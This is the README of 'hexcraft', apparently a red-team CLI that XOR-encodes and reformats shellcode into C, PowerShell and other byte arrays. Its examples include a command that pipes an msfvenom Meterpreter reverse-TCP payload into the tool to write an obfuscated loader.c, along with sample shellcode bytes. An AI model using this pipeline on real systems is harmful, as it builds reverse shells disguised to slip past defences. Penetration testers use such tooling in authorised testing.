<div align="center">

# hexcraft

**Shellcode and payload manipulation CLI** — encode, encrypt, format-convert, and embed raw binaries without leaving the terminal.

[![CI](https://github.com/franckferman/hexcraft/actions/workflows/ci.yml/badge.svg)](https://github.com/franckferman/hexcraft/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.9+-3776AB?style=flat-square&logo=python&logoColor=white)]()
[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)

</div>

---

## Installation

```bash
pipx install hexcraft
```

```bash
# From source
git clone https://github.com/franckferman/hexcraft.git
cd hexcraft
pip install -e .
```

---

## Demo

![hexcraft demo](.assets/demo.gif)

---

## Usage

```
hexcraft <input> [options]

arguments:
  input               Input file path or stdin (use -)

options:
  -h, --help          show this help message and exit
  -f FORMAT           Output format: hex, c, cs, py, ps1, raw  (default: hex)
  -e ENCODER          Encoder: xor, rot, none                  (default: none)
  -k KEY              XOR/ROT key (hex or decimal)
  -v, --var-name      Variable name for code output            (default: buf)
  -w WIDTH            Bytes per line in code output            (default: 16)
  -o OUTPUT           Output file (default: stdout)
  -q, --quiet         No headers or stats
```

### Format examples

Convert a raw `.bin` to a C byte array:

```bash
hexcraft beacon.bin -f c -v shellcode
```
```c
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    ...
};
unsigned int shellcode_len = 272;
```

XOR-encode and output as PowerShell:

```bash
hexcraft beacon.bin -e xor -k 0x41 -f ps1 -v $buf
```
```powershell
[Byte[]] $buf = 0xbd,0x09,0xc2,0xa1,0xb1,0xa7,...
```

Pipe from msfvenom directly:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw | \
  hexcraft - -e xor -k 0xde -f c -v shellcode -o loader.c
```

---

## Contributing

Pull requests are welcome. To add a new output format or encoder, see [CONTRIBUTING.md](CONTRIBUTING.md).

Issues: [github.com/franckferman/hexcraft/issues](https://github.com/franckferman/hexcraft/issues)

---

## License

Licensed under the **MIT License**.
See [LICENSE](LICENSE) for full terms.

---

## Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
